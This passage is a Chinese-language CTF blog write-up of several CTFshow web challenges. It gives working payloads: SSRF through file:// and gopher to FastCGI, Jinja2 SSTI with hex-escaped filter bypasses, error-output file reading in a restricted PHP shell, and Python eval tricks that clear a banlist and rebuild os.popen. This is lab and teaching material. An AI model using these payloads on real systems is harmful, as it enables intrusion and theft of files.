<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?picurl=aHR0cDovL3AucWxvZ28uY24vZ2gvMzcyNjE5MDM4LzM3MjYxOTAzOC8w</span><br></pre></td></tr></table></figure>

<p>base64解码是个图片地址，直接换用<code>file</code>协议能读<code>passwd</code></p>
<p>嗅探到nginx，读一下配置文件<code>/etc/nginx/conf.d/default.conf</code></p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402201750089.png" alt="image-20240220175037927"></p>
<p>网站目录<code>/var/www/bushihtml</code>，fastcgi开在9000端口</p>
<p>直接gopher打</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python gopherus.py --exploit fastcgi</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402201751079.png" alt="image-20240220175154791"></p>
<h2 id="1024-hello-world"><a href="#1024-hello-world" class="headerlink" title="1024_hello_world"></a>1024_hello_world</h2><p>看起来像ssti，fuzz一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;&#x27;&quot;, &#x27;.&#x27;, &#x27;_&#x27;, &#x27;\r&#x27;, &#x27;\x0b&#x27;, &#x27;\x0c&#x27;, &#x27;&#123;&#123;&#x27;]</span><br></pre></td></tr></table></figure>

<p>被ban了就没法直接打回显了</p>
<p>但是可以用<code>&#123;%print(...)%&#125;</code>代替</p>
<p>也有更麻烦的用<code>&#123;% if ... %&#125;1&#123;% endif %&#125;</code>盲注</p>
<p>这里选用<code>&#123;%print(...)%&#125;</code></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9584">以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key=&#123;%print(()[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbase\x5f\x5f&quot;][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[117][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;popen&quot;](&quot;cat /c*&quot;)[&quot;read&quot;]())%&#125;</span><br><span class="line"></span><br><span class="line">&#x27;_&#x27;hex编码-&gt;&#x27;\x5f&#x27;，也可以换用unicode</span><br></pre></td></tr></table></figure>

<p>主要就是用<code>()[&quot;\x5f\x5fclass\x5f\x5f&quot;]</code>来代替<code>().__class__</code></p>
<h2 id="原谅4"><a href="#原谅4" class="headerlink" title="原谅4"></a>原谅4</h2><p>看起来很简单</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php isset($_GET[&#x27;xbx&#x27;])?system($_GET[&#x27;xbx&#x27;]):highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>

<p>但是进去才知道命令基本不可用，<code>bin</code>里面只有<code>ls rm sh</code>这三条命令可用</p>
<p>但是还有一种利用报错读取来读到文件内容</p>
<p>如果有<strong>读取文件</strong>的权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo `. /f* 2&gt;&amp;1` -urlencode&gt; echo `. /f* 2&gt;%261`</span><br></pre></td></tr></table></figure>

<p>如果有<strong>执行文件</strong>的权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo `/f* 2&gt;&amp;1` -urlencode&gt; echo `/f* 2&gt;%261`</span><br></pre></td></tr></table></figure>

<p>无非就是一个用了<code>sh</code>执行shell脚本的区别</p>
<h2 id="原谅5-fastapi2"><a href="#原谅5-fastapi2" class="headerlink" title="原谅5_fastapi2"></a>原谅5_fastapi2</h2><p>严格意义来说不是ssti，fuzz一下，过滤了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;import&#x27;, &#x27;open&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;class&#x27;, &#x27;&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;vars&#x27;, &#x27;str&#x27;, &#x27;chr&#x27;]</span><br></pre></td></tr></table></figure>

<p>除了之前用的<code>str</code>可以造成回显，<code>list</code>同样也可以打出回显</p>
<p>可以直接用<code>list(globals())</code>看到当前的全局变量</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402221531945.png" alt="image-20240222153114837"></p>
<p>比较特殊的就是其中的<code>youdontknow</code>，直接进去看就能知道这是banlist</p>
<p>而且属性应该是list</p>
<p>列表有一个函数操作是<code>[].clear()</code>，可以清空该列表内元素</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">q=youdontknow.clear()</span><br><span class="line">q=list(youdontknow)</span><br></pre></td></tr></table></figure>

<p>可见banlist已经被清空了，接下来就是随便打</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">q=[].__class__.__bases__[0].__subclasses__()[127].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /f*&#x27;).read()</span><br><span class="line">q=open(&quot;/flag&quot;).read()</span><br></pre></td></tr></table></figure>

<h3 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h3><blockquote>
<p>由于规定了接收的q是string型，因此<code>&quot;&quot;.__class__</code>这类返回的class类型就会引起错误，因此需要将其转为str型</p>
<p>可以<strong>通过<code>bytes.fromhex()</code>绕过waf，同时也可以保证str型</strong>。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">q=__impｏrt__(bytes.fromhex(hex(28531)[2:]).decode()).pｏpen(bytes.fromhex(hex(6c73)[2:]).decode()).readlines()</span><br><span class="line">其中的ｏ是全角字符,可以绕过waf</span><br><span class="line">28531和6c73分别是os,ls的hex</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402221548773.png" alt="image-20240222154818718"></p>
<p>还有种比较抽象的办法</p>
<p>有一个内置函数没有被ban：<code>dir()</code>，用来查看当前范围内变量</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402221804818.png" alt="image-20240222180447783"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q=kiword</span><br></pre></td></tr></table></figure>

<p>可见最后的kiword是<code>chr</code></p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402221805629.png" alt="image-20240222180522602"></p>
<p>就可以利用<code>getattr</code>拼凑出函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getattr(__builtins__,kiword)-&gt;__builtins__.chr</span><br><span class="line">getattr(__builtins__,kiword)(97)-&gt;__builtins__.chr(97)-&gt;a</span><br></pre></td></tr></table></figure>

<p>可以拼出<code>__builtins__.__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">getattr(__builtins__,kiword)(95)+getattr(__builtins__,kiword)(95)+getattr(__builtins__,kiword)(105)+getattr(__builtins__,kiword)(109)+getattr(__builtins__,kiword)(112)+getattr(__builtins__,kiword)(111)+getattr(__builtins__,kiword)(114)+getattr(__builtins__,kiword)(116)+getattr(__builtins__,kiword)(95)+getattr(__builtins__,kiword)(95)</span><br><span class="line">-&gt;</span><br><span class="line">__import__</span><br><span class="line"></span><br><span class="line">getattr(__builtins__,kiword)(111)+getattr(__builtins__,kiword)(115)</span><br><span class="line">-&gt;</span><br><span class="line">os</span><br><span class="line"></span><br><span class="line">getattr(__builtins__,kiword)(112)+getattr(__builtins__,kiword)(111)+getattr(__builtins__,kiword)(112)+getattr(__builtins__,kiword)(101)+getattr(__builtins__,kiword)(110)</span><br><span class="line">-&gt;</span><br><span class="line">popen</span><br><span class="line"></span><br><span class="line">getattr(__builtins__,kiword)(108)+getattr(__builtins__,kiword)(115)</span><br><span class="line">-&gt;</span><br><span class="line">ls</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line"></span><br><span class="line">getattr(getattr(__builtins__,getattr(__builtins__,kiword)(95)+getattr(__builtins__,kiword)(95)+getattr(__builtins__,kiword)(105)+getattr(__builtins__,kiword)(109)+getattr(__builtins__,kiword)(112)+getattr(__builtins__,kiword)(111)+getattr(__builtins__,kiword)(114)+getattr(__builtins__,kiword)(116)+getattr(__builtins__,kiword)(95)+getattr(__builtins__,kiword)(95))(getattr(__builtins__,kiword)(111)+getattr(__builtins__,kiword)(115)),getattr(__builtins__,kiword)(112)+getattr(__builtins__,kiword)(111)+getattr(__builtins__,kiword)(112)+getattr(__builtins__,kiword)(101)+getattr(__builtins__,kiword)(110))(getattr(__builtins__,kiword)(108)+getattr(__builtins__,kiword)(115)).read()</span><br><span class="line"></span><br><span class="line">-urlencode&gt;</span><br><span class="line"></span><br><span class="line">getattr(getattr(__builtins__%2Cgetattr(__builtins__%2Ckiword)(95)%2Bgetattr(__builtins__%2Ckiword)(95)%2Bgetattr(__builtins__%2Ckiword)(105)%2Bgetattr(__builtins__%2Ckiword)(109)%2Bgetattr(__builtins__%2Ckiword)(112)%2Bgetattr(__builtins__%2Ckiword)(111)%2Bgetattr(__builtins__%2Ckiword)(114)%2Bgetattr(__builtins__%2Ckiword)(116)%2Bgetattr(__builtins__%2Ckiword)(95)%2Bgetattr(__builtins__%2Ckiword)(95))(getattr(__builtins__%2Ckiword)(111)%2Bgetattr(__builtins__%2Ckiword)(115))%2Cgetattr(__builtins__%2Ckiword)(112)%2Bgetattr(__builtins__%2Ckiword)(111)%2Bgetattr(__builtins__%2Ckiword)(112)%2Bgetattr(__builtins__%2Ckiword)(101)%2Bgetattr(__builtins__%2Ckiword)(110))(getattr(__builtins__%2Ckiword)(100)%2Bgetattr(__builtins__%2Ckiword)(105)%2Bgetattr(__builtins__%2Ckiword)(114)).read()</span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
<div class="share-btn">
      <span class="share-sns share-outer">
        <i class="ri-share-forward-line"></i>
        分享
      </span>
      <div class="share-wrap">
        <i class="arrow"></i>
        <div class="share-icons">
          
          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
            <i class="ri-weibo-fill"></i>
          </a>
          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
            <i class="ri-wechat-fill"></i>
          </a>
          <a class="qq share-sns" href="javascript:;" data-type="qq">
            <i class="ri-qq-fill"></i>
          </a>
          <a class="douban share-sns" href="javascript:;" data-type="douban">
            <i class="ri-douban-line"></i>
          </a>
          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
            <i class="icon icon-qzone"></i>
          </a> -->
          
          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
            <i class="ri-facebook-circle-fill"></i>
          </a>
          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
            <i class="ri-twitter-fill"></i>
          </a>
          <a class="google share-sns" href="javascript:;" data-type="google">
            <i class="ri-google-fill"></i>
          </a>
        </div>
      </div>
</div>

<div class="wx-share-modal">
    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
    <p>扫一扫，分享到微信</p>
    <div class="wx-qrcode">
      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2024/02/27/ctfshow%E7%BB%83%E4%B9%A0/" alt="微信分享二维码">
    </div>
</div>

<div id="share-mask"></div>  
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>

    </footer>
  </div>

   
  <nav class="article-nav">
    
    
      <a href="/2024/01/04/%E8%8F%9C%E7%8B%97%E6%9D%AF/" class="article-nav-link">
        <strong class="article-nav-caption">下一篇</strong>
        <div class="article-nav-title">ctfshow菜狗杯</div>
      </a>
    
  </nav>

  
   
    
    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
    <div id="twikoo" class="twikoo"></div>
    <script>
        twikoo.init({
            envId: ""
        })
    </script>
 
</article>

</section>
      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2022-2024
        <i class="ri-heart-fill heart_icon"></i> b1xcy
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
      </li>
    </ul>
  </div>
</footer>    
    </main>
    <div class="float_btns">
      <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

    </div>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/side.svg" alt="b1xcy&#39;s blog"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i></p>
  <div class="reward-box">
    
    
  </div>
</div>
    
<script src="/js/jquery-3.6.0.min.js"></script>
 
<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->
 
<script src="/js/tocbot.min.js"></script>

<script>
  tocbot.init({
    tocSelector: ".tocbot",
    contentSelector: ".article-entry",
    headingSelector: "h1, h2, h3, h4, h5, h6",
    hasInnerContainers: true,
    scrollSmooth: true,
    scrollContainer: "main",
    positionFixedSelector: ".tocbot",
    positionFixedClass: "is-position-fixed",
    fixedSidebarOffset: "auto",
  });
</script>

<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
<link
  rel="stylesheet"
  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
/>
<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->
 <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script> 
<!-- MathJax -->

<!-- Katex -->

<!-- busuanzi  -->

<!-- ClickLove -->

<!-- ClickBoom1 -->

<!-- ClickBoom2 -->

<!-- CodeCopy -->
 
<link rel="stylesheet" href="/css/clipboard.css">
 <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>
 
<!-- CanvasBackground -->

<script>
  if (window.mermaid) {
    mermaid.initialize({ theme: "forest" });
  }
</script>


    
    

  </div>
</body>

</html>